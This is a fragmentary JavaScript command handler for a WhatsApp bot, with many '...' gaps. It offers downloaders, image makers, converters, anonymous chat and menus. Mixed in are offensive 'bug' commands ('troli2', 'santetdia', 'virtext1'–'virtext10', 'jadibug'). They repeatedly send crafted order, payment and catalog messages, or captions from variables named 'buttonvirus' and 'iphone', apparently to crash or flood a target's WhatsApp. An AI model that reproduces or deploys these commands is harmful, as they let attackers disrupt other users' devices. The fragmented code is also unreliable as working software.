xylaa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
break
//=================================================//
case 'poll': {
...
xylaa.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
...
xylaa.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'troli2': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await xylaa.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
...
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
	...
	xylaa.relayMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
	}
	}
	break
case 'santetdia': {
...
xylaa.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
...
xylaa.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
...
a = await xylaa.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
xylaa.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
xylaa.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
xylaa.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
...
xylaa.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
...
let { toAudio } = require('./viruss/lib/converter')
let audio = await toAudio(media, 'mp4')
xylaa.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${xylaa.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
...
xylaa.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
...
xylaa.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
...
if (/image/.test(mime)) {
anu = await xylaa.downloadAndSaveMediaMessage(quoted)
xylaa.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await xylaa.downloadAndSaveMediaMessage(quoted)
xylaa.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
case 'virtext1': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone}` }, { quoted: doc })
}
}
break
case 'virtext2': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone1}` }, { quoted: doc })
}
}
break
case 'virtext3': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone2}` }, { quoted: doc })
}
}
break
case 'virtext4': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone3}` }, { quoted: doc })
}
}
break
case 'virtext5': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone4}` }, { quoted: doc })
}
}
break
case 'virtext6': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone5}` }, { quoted: doc })
}
}
break
case 'virtext7': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${iphone6}` }, { quoted: doc })
}
}
break
case 'virtext8': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${buttonkal}` }, { quoted: doc })
}
}
break
case 'virtext9': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${buttonvirus}` }, { quoted: doc })
}
}
break
case 'virtext10': {
...
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
xylaa.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/3951f34e7d99b8986f20b.jpg' }, caption: `${ngazap(prefix)}`}, { quoted: doc })
}
}
break
case 'sound1':
...
await xylaa.sendMessage(m.chat, { audio: x_tiktok, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case'glitch3':
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
...
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => xylaa.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
...
if (isBanChat) return reply(mess.banChat)
             ...
             let anu = await maker.textpro(link, q)
                xylaa.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
...
xylaa.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) return reply(`Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`)
...
if (isBanChat) return reply(mess.banChat)
     ...
     console.log(anui)
    xylaa.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
  case 'whitebear':{
  	if (isBan) return reply(mess.ban)	 			
...
console.log(anu)
xylaa.sendMessage(from,{image:{url:anu}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
	if (isBan) return reply(mess.ban)	 			
...
let mese = await xylaa.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await xylaa.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
...
let encmedia = await xylaa.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
...
if (err) throw err
let buffer = fs.readFileSync(ran)
xylaa.sendMessage(m.chat, { image: buffer }, { quoted: m})
fs.unlinkSync(ran)
})
}
break
...
await xylaa.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
...
let audio = await toAudio(media, 'mp4')
xylaa.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tomp3': {
   if (isBan) return reply(mess.ban)	 			
...
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
xylaa.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${xylaa.user.name} (${m.id}).mp3`}, { quoted : m })
}
break
...
let audio = await toPTT(media, 'mp4')
xylaa.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
   if (isBan) return reply(mess.ban)	 			
...
let media = await xylaa.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await xylaa.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Converted From Webp To Gif' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
	case 'tourl': {
...
break
	    ...
	    localFile = await xylaa.downloadAndSaveMediaMessage(quoted, hmm)
	    ...
	    xylaa.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
...
xylaa.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
case 'google': {
   if (isBan) return reply(mess.ban)	 			
...
case 'ig2': case 'igdl2': case 'instagram2': {
	...
	if (isBanChat) return reply(mess.banChat)
	            ...
	            .then(async(result) => {	  
	            var halo = 0		
	            xylaa.sendMessage(m.chat, { image: { url: result.user.profilePicUrl }, jpegThumbnail: await getBuffer(result.user.profilePicUrl), caption: `*----「 INSTAGRAM DOWNLOADER 」----*\n\n*${themeemoji} Username :* ${result.user.username}\n*${themeemoji} Fullname :* ${result.user.fullName}\n*${themeemoji} Followers :* ${result.user.followers}\n*${themeemoji} Following :* ${result.user.following}\n*${themeemoji} ID :* ${result.user.id}\n*${themeemoji} Filetype :* ${result.medias[0].fileType}\n*${themeemoji} Type :* ${result.medias[0].type}\n*${themeemoji} Jumlah Media :* ${result.medias.length}\n*${themeemoji} Url :* ${text}\n\n*${botname}*` }, { quoted: m })	                                  	                      	            
		        for(let i of result.medias) {		
		        if(i.url.includes('mp4')){		           			    				
				let link = await getBuffer(i.url)
                xylaa.sendMessage(m.chat, { video: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })
                } else {
                let link = await getBuffer(i.url)
                xylaa.sendMessage(m.chat, { image: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })                      
               }
              }
...
if (isBanChat) return reply(mess.banChat)
if (args[0] === "mp4") {
xylaa.sendMessage(from, {video:{url:args[1]}, caption:'Done!', mimetype:'video/mp4'}, {quoted:m})
} else if (args[0] === "jpg") {
xylaa.sendMessage(from, {image:{url:args[1]}, caption:'Done!'}, {quoted:m})
} else {
reply("Error! ")
}
}
...
try {
xylaa.sendMessage(from, {video:{url:args[0]}, caption:"Succes", contextInfo:{externalAdReply:{
title:`${global.botname}`,
...
if (!args[0]) return reply(`Where's the link?`)
try {
xylaa.sendMessage(from, {image:{url:args[0]}, caption:"Success", contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.ownername}`,
thumbnail: log0,
mediaType:2,
...
if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail:buf, caption: `${botname}`}, { quoted: m })
                }).catch((err) => {
                    reply(mess.error)
                })
            }
...
if (isBanChat) return reply(mess.banChat)	             
             if (!text) return reply(`Where is the link?`)
                ...
                xeonkey.Twitter(`${text}`).then(async (data) => {                    
                    ...
                    txt += `*${botname}*`
                buf = await getBuffer(data.thumbnail)    
                xylaa.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })
                for (let i of data.medias) {
                xylaa.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*${text}*`}, { quoted: m })
                }
                }).catch((err) => {
                    reply(mess.error)
                })
...
if (isBanChat) return reply(mess.banChat)	             
             if (!text) return reply(`Where is the link?`)
                if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*The link you provided is not valid*`)
                xeonkey.Twitter(`${text}`).then(async (data) => {
                xylaa.sendMessage(m.chat, { audio: { url: data.medias[1].url }, mimetype: 'audio/mp4'}, { quoted: m })
                }).catch((err) => {
                    reply(mess.reply)
                })
            }
...
if (isBanChat) return reply(mess.banChat)
            ...
            let bocil = require('@bochilteam/scraper')  
                ...
                xylaa.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*${themeemoji} Quality :* ${i.quality}`}, { quoted: m })
                }          
                }).catch((err) => {
                    reply(mess.error)
                })
...
if (isBanChat) return reply(mess.banChat)
  ...
  xylaa.sendMessage(m.chat, { audio: { url: anu.url[0].url }, mimetype: 'audio/mp4' }, { quoted: m })      
                }).catch((err) => {
                    reply(mess.error)
                })
            }
...
if (isBanChat) return reply(mess.banChat)
		...
		let { pinterest } = require('./lib/scraper')
                ...
                xylaa.sendMessage(m.chat, { image: { url: result }, caption: '${themeemoji} Media Url : '+result }, { quoted: m })
            }
            break
...
if (isBanChat) return reply(mess.banChat)
	...
	if (isBanChat) return reply(mess.banChat)
            ...
            xylaa.sendImage(m.chat, thumb, capt, m)
            }
            break
...
if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
           ...
           for (let i of anu) {    
           linkye = `*APK DOWNLOAD*\n\n*Title:* ${i.title}\n*Updated:* ${i.up}\n*Version:* ${i.vers}\n*Size:* ${i.size}\n*Url:* \n*Desc:* ${i.desc}`         
                xylaa.sendMessage(m.chat, { image: await getBuffer(i.thumb), jpegThumbnail: await getBuffer(i.thumb), caption: `${linkye}` }, { quoted: m })
                xylaa.sendMessage(m.chat, {document: await getBuffer(i.link), mimetype: `application/vnd.android.package-archive`, fileName: `${i.title}`}, {quoted:m})  
                }  
                }).catch((err) => {
                    reply(mess.error)
                }) 
...
case 'tagme': {
	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
xylaa.sendMessage(m.chat, {text:`@${m.sender.split("@")[0]}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break
    ...
    xylaa.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
			break
...
if (isBanChat) return reply(mess.banChat)
             ...
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await maker.textpro(link, q)
                xylaa.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname},For my Darling ` }, { quoted: m })
             }
             break
            case 'drakorxxx':
               if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
	...
	if (isBanChat) return reply(mess.banChat)
            ...
            xylaa.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'animexxx':{
            	   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
				...
				await xylaa.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    reply(mess.error)
                })
...
xylaa.sendMessage(m.chat,{image:{url:result.images.jpg.large_image_url},caption:details},{quoted:m})   
break
case 'manga':
   if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
...
xylaa.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})   
break
            break
case 'lyrics': {
		            	if (isBan) return reply(mess.ban)
...
xylaa.sendMessage(from, { image : { url : Map }, caption : captt})
break
case 'covidindo':
case 'covid':
if (isBan) return reply(mess.ban)	 			
...
xylaa.sendMessage(from, {text : `Case : ${kasus}\n\nDead : ${kematian}\n\nHealed : ${sembuh}`}, m)
break
case 'tvschedule':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
...
xeonkey.Film(q)
    ...
    let krl = `*❒「  Film ${q} 」*\n*🌿 Author* : ${data[0].author}\n\n`
               ...
               xylaa.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
});
break
case 'img':
case 'image': {
...
teks = "\nDarkjokes*"
xylaa.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })
break
case 'cnn-news':
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
...
teks += "══════════════════"
xylaa.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })
...
break
	...
	if (isBanChat) return reply(mess.banChat)
            ...
            xylaa.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
case 'shortstoryx':{
	   if (isBan) return reply(mess.ban)	 			
...
if (isBanChat) return reply(mess.banChat)
                ...
                let random = anu[Math.floor(Math.random() * anu.length)]
                xylaa.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male🙎🏻‍♂️` }, { quoted: m })
                xylaa.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female🙎🏻‍♀️` }, { quoted: m })
            }
	    break
...
const res2 = await xylaaWiki(q).catch(e => {
return reply('_[ ! ] Error Result Not Found_') 
}) 
const result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
xylaa.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
break
            case 'wikimedia': {
            	 	if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Name :* ${anu.message.nama}\n${themeemoji} *Meaning :* ${anu.message.arti}\n${themeemoji} *Notes :* ${anu.message.catatan}`, m)
            }
            break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Wedding Date :* ${anu.message.tanggal}\n${themeemoji} *Characteristics :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            	   if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Born :* ${anu.message.hari_lahir}\n${themeemoji} *Business :* ${anu.message.usaha}`, m)
            }
            break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendImage(m.chat, anu.message.image, `${themeemoji} *Born :* ${anu.message.tgl_lahir}\n${themeemoji} *Tarot Symbol :* ${anu.message.simbol_tarot}\n${themeemoji} *Meaning :* ${anu.message.arti}\n${themeemoji} *Notes :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            	   if (isBan) return reply(mess.ban)
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Date :* ${anu.message.tgl_memancing}\n${themeemoji} *Results :* ${anu.message.result}\n${themeemoji} *Notes :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            	   if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Results :* ${anu.message.result}\n${themeemoji} *Notes :* ${anu.message.catatan}`, m)
            }
            break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (anu.status == false) return reply(anu.message)
                xylaa.sendText(m.chat, `${themeemoji} *Results :* ${anu.message}`, m)
            }
            break
			case 'tktoknowm':
			case 'ttnowm':
...
xylaa.sendMessage(from, { video: { url: data.nowm }}, { quoted: m })
})
}
break
case 'tktokaudio':
...
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
xylaa.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})}
break
case 'tktok':
case 'tktk':
...
if (!q.includes('youtube.com')) return reply(`Error, Link Invalid!!`)
let ytlink = await (`https://caliphapi.com/api/yta?url=${q}&apikey=xPxsaElx`)
kdrt = await getBuffer(ytlink.result)
m.reply(mess.wait)
xylaa.sendMessage(m.chat, { video: kdrt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Done!` }, { quoted:m })
}
break
case 'ytmp4':{
   if (isBan) return reply(mess.ban)	 			
...
m.reply(mess.wait)
xylaa.sendMessage(m.chat, { video: kdrtt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Done!` }, { quoted:m })
}
break
case 'ytvd': {
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
xylaa.sendMessage(from, {video:{url:args[0]}, mimetype:"video/mp4", caption:"Success", contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.botname}`,
thumbnail: log0,
mediaType:2,
...
case 'ytad': {
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
xylaa.sendMessage(from, {audio:{url:args[0]}, mimetype:"audio/mp4", ptt:true, contextInfo:{externalAdReply:{
title:`${global.botname}`,
body:`${global.botname}`,
thumbnail: log0,
mediaType:2,
...
break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${anu.title}`}, { quoted : m }).catch((err) => reply(mess.error))
                xylaa.sendMessage(m.chat, { video: { url: anu.video }, jpegThumbnail:tummb, caption: `${util.format(anu)}`}, { quoted: m }).catch((err) => reply(mess.error))
            }
            break
...
*${themeemoji}TITLE:* ${data.title}\n*${themeemoji}QUALITY:* ${data.medias[0].quality}\n*${themeemoji}SIZE:* ${data.medias[0].formattedSize}\n*${themeemoji}DURATION* ${data.duration}\n*${themeemoji}ID:* ${data.medias[0].cached}\n*${themeemoji}LINK:* ${data.url}\n\n*${botname}*`
  buf = await getBuffer(data.thumbnail)
  xylaa.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${cap}` }, { quoted: m })
  xylaa.sendMessage(m.chat, { video: { url: data.medias[0].url }, jpegThumbnail:buf, caption: `*${themeemoji}TITLE:* ${data.title}\n*${themeemoji}QUALITY:* ${data.medias[0].quality}\n*${themeemoji}SIZE:* ${data.medias[0].formattedSize}` }, { quoted: m })  
                }).catch((err) => {
                    reply(mess.reply)
                })
            }
...
*Link* : ${baby1[0].link}`
reply(`${result4}`)
xylaa.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
...
`,
		    ...
		    anu.media.map(async (url) => {
		        xylaa.sendMessage(m.chat, { image: { url }, caption: `${themeemoji} Title : ${anu.title}\n${themeemoji} Author : ${anu.author.name}\n${themeemoji} Like : ${anu.like}\n${themeemoji} Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
	...
	if (isBanChat) return reply(mess.banChat)
		...
		let result = anu[Math.floor(Math.random() * anu.length)]
		xylaa.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tempo': {
if (isBan) return reply(mess.ban)
...
var req = args.join(' ')
media = await xylaa.downloadAndSaveMediaMessage(quoted, "tempo")
if (isQuotedAudio) {
ran = getRandom('.mp3')
...
xylaa.sendMessage(from, {audio:hah, mimetype:'audio/mp4', ptt:true}, {quoted:m})
fs.unlinkSync(ran)
})
...
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
xylaa.sendMessage(from, {video:hah, mimetype:'video/mp4'}, {quoted:m})
fs.unlinkSync(ran)
})
} else {
...
if (isBanChat) return reply(mess.banChat)
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await xylaa.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
...
xylaa.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
...
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
xylaa.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
reply("Send video/audio")
...
break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
...
`.trim()
                xylaa.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
            	if (isBan) return reply(mess.ban)
...
View List Of Messages With ${prefix}listmsg`)
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            	if (isBan) return reply(mess.ban)
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                xylaa.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await xylaa.getName(m.sender)} Welcome To Anonymous Chat\n\nType Start for starting, stop for stopping, next for next partner, leave for leaving anonymous chat\`\`\``, xylaa.user.name, m)
            }
			break
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (!room) {
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In An Anonymous Session, Press The Button To Find A Partner \`\`\``)
                   reply(false)
                }
                reply('Ok')
                let other = room.other(m.sender)
                if (other) await xylaa.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, `\`\`\`You Are Still In An Anonymous Session, Type Stop For Stop Searching\`\`\``, xylaa.user.name, m)
                    reply(false)
                }
                ...
                if (room) {
                    ...
                    await xylaa.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, xylaa.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await xylaa.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, Now You Can Send Message\`\`\``, xylaa.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, `\`\`\`Please Wait, Looking For A Partner\`\`\``, xylaa.user.name, m)
                }
                break
            }
	...
	if (isBanChat) return reply(mess.banChat)
                ...
                if (!romeo) {
                    ...
                    await xylaa.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In An Anonymous Session, Type Start For Star Searching Partner\`\`\``)
                    reply(false)
                }
...
xylaa.sendMessage(m.chat, { audio: mekiwangy, mimetype: 'audio/mp4', seconds: '9999999999999999', ptt: true }, { quoted: m })
	...
	if (isBanChat) return reply(mess.banChat)
        ...
        if (stderr.trim()) reply(stderr)
            ...
            case 'owner': case 'creator': {
                xylaa.sendContact(m.chat, global.vcardowner, m)
            }
            break
  case 'setmenu': {
            	if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
            ...
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                ...
                xylaa.sendListMsg(m.chat, `Please select the menu you want to change!`, ` `, xylaa.user.name, `Click Here`, sections, m)
                }
            }
            break
case 'request': {
...
for (let i of owner) {
xylaa.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:m})
}
xylaa.sendMessage(m.chat, {text: teks + teks2 + teks1, mentions:[m.sender]}, {quoted:m})
}
break
...
if (isBanChat) return reply(mess.banChat)
                    	...
                    	xylaa.sendMessage(`${owner}@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
Report Message: ${text}` })
...
*_Saweria : https://saweria.co/xylaa_*
...
sourceUrl: "https://telegra.ph/file/df0edc1680a71b37145af.jpg"
}}
}
xylaa.sendMessage(m.chat, buttonMessage, { quoted: m })
}
...
└─────────────┈ ⳹`)
xylaa.sendMessage(from, { text: kocak, quoted: m})
xylaa.sendMessage(m.chat, { audio: pentol, mimetype: 'audio/mp4', seconds: '9999999999999999', ptt: true }, { quoted: m })
}
break
                case 'command': {
                	   if (isBan) return reply(mess.ban)
...
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
          ...
          listType: 1
            ...
            xylaa.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
case 'allmenu':
...
╠${prefix}jadikatalog [ reply sticker ] jumlah
...
await xylaa.send5ButImg(from, `╔═══════✪「 OWNER 」	
╠ ${prefix}self
╠ ${prefix}public
╠ ${prefix}antitag
╠ ${prefix}ban [add/del]
...
await xylaa.send5ButImg(from, `╔═══════✪「 GROUP 」	
╠${prefix}groupsetting
╠${prefix}grouplink
╠${prefix}ephemeral [option]
╠${prefix}setgcpp [image]
...
await xylaa.send5ButImg(from, `╔═══════✪「 RPG 」	
╠${prefix}hunt
╠${prefix}mine
╠${prefix}fish
╠${prefix}heal
...
await xylaa.send5ButImg(from, `╔═══════✪「 MAKER 」	
╠${prefix}candy
╠${prefix}8bit
╠${prefix}horror
╠${prefix}hoorror
...
await xylaa.send5ButImg(from, `╔═══════✪「 DOWNLOAD 」	
╠${prefix}instagram [url]
╠${prefix}igtv [url]
╠${prefix}igstory [username]
╠${prefix}facebook [url]
...
await xylaa.send5ButImg(from, `╔═══════✪「 SEARCH 」	
╠${prefix}play [query]
╠${prefix}song [query]
╠${prefix}yts [query]
╠${prefix}lyrics [query]
...
await xylaa.send5ButImg(from, `╔═══════✪「 CONVERT 」	
╠ ${prefix}toimage [reply stick]
╠ ${prefix}sticker [reply img|gif]
╠ ${prefix}take [reply img|gif|stik]
╠ ${prefix}smeme [reply img]
...
await xylaa.send5ButImg(from, `╔═══════✪「 RANDOM IMG 」	
╠${prefix}coffee
╠${prefix}bts
╠${prefix}woof
╠${prefix}meow
...
await xylaa.send5ButImg(from, `╔═══════✪「 EMOTE 」	
╠${prefix}instagramemoji
╠${prefix}facebookemoji
╠${prefix}iphoneemoji
╠${prefix}samsungemoji
...
await xylaa.send5ButImg(from, `╔═════✪「 IMG EFFECT 」	
╠${prefix}wanted
╠${prefix}blur
╠${prefix}framed
╠${prefix}gayeffect
...
await xylaa.send5ButImg(from, `╔═══════✪「 ANIME 」	
╠${prefix}naruto
╠${prefix}yaoi
╠${prefix}neko2
╠${prefix}waifu
...
await xylaa.send5ButImg(from, `╔═══════✪「 STICKER 」	
╠ ${prefix}patrick
